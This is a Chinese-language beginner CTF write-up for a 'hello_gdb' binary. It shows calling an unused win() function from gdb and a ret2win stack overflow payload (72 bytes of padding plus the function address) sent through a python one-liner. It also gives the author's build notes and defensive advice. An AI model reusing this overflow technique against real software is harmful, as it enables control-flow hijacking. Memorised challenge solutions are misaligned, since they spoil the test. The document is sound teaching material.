# pwn-hello-gdb

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 1（该方向第一课） |
| 形态 | 附件题，无容器 |
| 考点 | 符号表、gdb 断点与 `call`、`objdump -d` 读栈帧、ret2win |
| 附件 | `files/hello_gdb`（ELF 64-bit x86-64，带符号，16 KB） |
| Flag | 提交格式 `flag{...}`，由 `win()` 打印 |

静态工具（`strings` / `objdump`）看的是"代码写了什么"，gdb 看的是"程序跑起来时是什么"。
这中间的差别，寄存器、栈、函数调用，就是动态调试的全部意义。

本题的程序里有一个会打印 flag 的函数，但 `main` 从来不调用它。要么让 gdb 替你调一次，
要么自己把控制流接过去。

## 题面（直接复制到平台「简介」）

附件 `hello_gdb` 是一个带符号的 Linux 可执行文件。程序里有一个函数会打印 flag，但 `main` 从来不调用它。目标：让这个函数执行一次。

**提示**：静态地看是"没有调用点"，动态地看未必，gdb 可以让任意函数在你指定的时刻跑起来。

## 二、题目描述

```bash
chmod +x hello_gdb
./hello_gdb
```

```
main() never calls win(). Prove it is still reachable.
ok
```

程序里存在一个 `win()`，它打印 flag。通读 `main` 会发现没有任何一处调用它。
二进制未 strip，符号表里能查到 `win`。

目标：让 `win()` 执行一次。

## 三、解题步骤

### 第 0 步：确认"从不被调用"

```bash
nm hello_gdb | grep -E ' win$| main$'
```

```
0000000000401196 T win
0000000000401214 T main
```

`T` 表示这两个都是 .text 段里的全局函数。`win` 确实存在，地址是 `0x401196`。

再看 `main` 里有没有 `call win`：

```bash
objdump -d hello_gdb | sed -n '/<main>:/,/ret/p'
```

```asm
401214 <main>:
  401218: push   %rbp
  401219: mov    %rsp,%rbp
  40121c: sub    $0x40,%rsp          # 栈帧 0x40，buf 在 rbp-0x40
  401239: call   4010a0 <setvbuf@plt>
  401248: call   401070 <puts@plt>   # 打印提示语
  40124d: lea    -0x40(%rbp),%rax
  401251: mov    $0x100,%edx         # 读 0x100 字节进 0x40 字节的缓冲区
  40125e: call   401080 <read@plt>
  40126d: call   401070 <puts@plt>   # 打印 "ok"
  401277: leave
  401278: ret
```

全域搜一遍 `call.*win` 也搜不到。结论：`win()` 是死代码，只能由外部强制调用。

### 第 1 步：路线 A：用 gdb 直接调

```bash
gdb -q ./hello_gdb
```

进入 gdb 后三条命令：

```
(gdb) b main
Breakpoint 1 at 0x40121c
(gdb) run
Starting program: /path/to/hello_gdb
Breakpoint 1, 0x000000000040121c in main ()
(gdb) call (void) win()
You called a function that main never calls.
flag{...}
```

每一行在做什么：

- `b main`：在 `main` 的入口下断点。程序一进来就停住，此时它已经完整加载、libc 已就位。
- `run`：启动被调试进程。停在断点，而不是跑完退出，这是后面能 `call` 的前提。
- `call (void) win()`：在当前停住的进程里执行一次函数调用。gdb 会把返回地址压栈、
  跳到 `win` 的地址、等它返回，再恢复现场。

**为什么写成 `(void)`**：这个二进制没有编译调试信息（没有 `-g`），gdb 只知道 `win` 是个函数，
不知道它的返回类型。不加返回类型时 gdb 会报：

```
'win' has unknown return type; cast the call to its declared return type
```

`win` 是 `void`，写成 `(void) win()` 即可。

拿到 `flag{...}` 后 `quit` 退出。

一条命令完成同样的事（不进交互界面）：

```bash
gdb -q -batch -ex 'b main' -ex 'run' -ex 'call (void) win()' ./hello_gdb
```

### 第 2 步：路线 B：不用 gdb

`main` 里的 `read(0, buf, 0x100)` 往 64 字节的 `buf` 里读 256 字节，缓冲区溢出。
`buf` 在 `rbp-0x40`，保存的 `rbp` 在 `rbp`，返回地址在 `rbp+8`：

```
偏移 = 0x40（buf 到 rbp） + 8（保存的 rbp） = 72
```

把这 8 个字节换成 `win` 的地址，`main` 的 `ret` 就会跳过去：

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x401196).to_bytes(8,'little'))" | ./hello_gdb
```

```
main() never calls win(). Prove it is still reachable.
ok
You called a function that main never calls.
flag{...}
```

其中 `0x401196` 来自第 0 步的 `nm`（`objdump -d hello_gdb | grep '<win>:'` 同样能看到）。
地址里含 `\x00`，所以必须按字节写，不能用 `echo` 拼字符串。

> flag 打印完之后进程会因为返回地址是 `0x4141414141414141` 而崩溃（退出码 139）。
> flag 在崩溃之前已经写到 stdout，这个退出码不影响结果。

### 第 3 步：留给你自己动手

1. 在 gdb 里执行 `disas win`，看 `win` 里到底做了什么，为什么它对 `strings` 不可见？
2. 在断点处执行 `x/8gx $rbp-0x40`，把 `buf` 的内容打出来，对照路线 B 的 payload 看每个字节落在哪。
3. 执行 `p/x $rsp` 看此时栈指针对齐到 16 的哪一半，再想：如果 `win` 里调的是 `printf` 而不是 `puts`，
   路线 B 会不会崩？崩了要怎么补。

## 四、原理

**gdb 的 `call` 在做什么**。停在被调试进程里时，gdb 可以读写它的寄存器和内存。
`call win()` 的实现是：在当前栈顶压一个"假返回地址"（指向 gdb 自己的 trap 指令），
把 `rip` 改成 `win` 的地址，继续执行；`win` 执行到 `ret` 时弹回那个假地址，gdb 收回控制权。
对进程来说，这就是一次普通的函数调用，所以不需要 `main` 里存在调用点。

**为什么必须先 `run`**。没启动进程时没有寄存器、没有栈、没有加载好的 libc，`call` 无从执行。

**为什么符号在就能调**。`call win()` 里的 `win` 由 gdb 通过符号表解析成地址。
`strip` 过的二进制没有符号表，就只能写 `call ((void(*)())0x401196)()` 这种形式。

**ret2win 的栈算术**。函数入口 `push rbp; mov rbp,rsp; sub rsp,N` 之后，局部变量在 `[rbp-N, rbp)`。
`leave` 是 `mov rsp,rbp; pop rbp`，`ret` 从 `[rbp+8]` 取返回地址。
所以从缓冲区首字节到返回地址的距离固定是 `缓冲区大小 + 8`（中间有对齐空洞时要按实际反汇编算）。
本题 `buf` 在 `rbp-0x40`，距离正好 `0x40 + 8 = 72`。

**栈对齐**。ABI 要求进入函数时 `rsp % 16 == 8`。`call` 会压 8 字节返回地址，天然满足；
用 `ret` 跳进函数则不满足，函数里若有 SSE 指令（`movaps`）就会 `SIGSEGV`。
本题的 `win` 带 `__attribute__((force_align_arg_pointer))`，入口自己 `and rsp,-16`，两种进入方式都稳。

## 五、防御建议

- **删掉不用的函数**。`win` 这种"没人调用但还在 .text 里"的函数是最省事的跳板。
  链接时加 `-ffunction-sections -Wl,--gc-sections`，未引用的函数会被回收。
- `strip` 二进制：`strip hello_gdb`。没有符号表，`call win()` 和 `nm | grep win` 都失效，
  攻击者只能靠反汇编自己找函数边界。
- 修掉溢出：`read` 的长度用 `sizeof buf`，别写死 `0x100`。编译器已经给过告警
  （`-Wstringop-overflow`），把告警当错误处理即可拦住。
- 打开 canary 与 PIE：覆盖返回地址会被检测，跳转目标也不再固定。
- 生产环境不要附带调试符号，也不要发布带 `-g` 的构建。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/hello_gdb` | 题目附件，ELF 64-bit x86-64，带符号，16152 字节 |

```
sha256: 380f7dca0ff33fbd19202fe0bccdcbc1797a612e20fa67c42e53e3445614204f
```

`file` 输出：

```
hello_gdb: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键符号：`win = 0x401196`，`main = 0x401214`；`buf = rbp-0x40`，返回地址偏移 72。

出题人自用（不发给选手）：`src/hello_gdb.c` 为源码，编译命令
`gcc -o files/hello_gdb src/hello_gdb.c -fno-stack-protector -no-pie`，
编译环境 `ubuntu:22.04` + `gcc 11.4.0`。
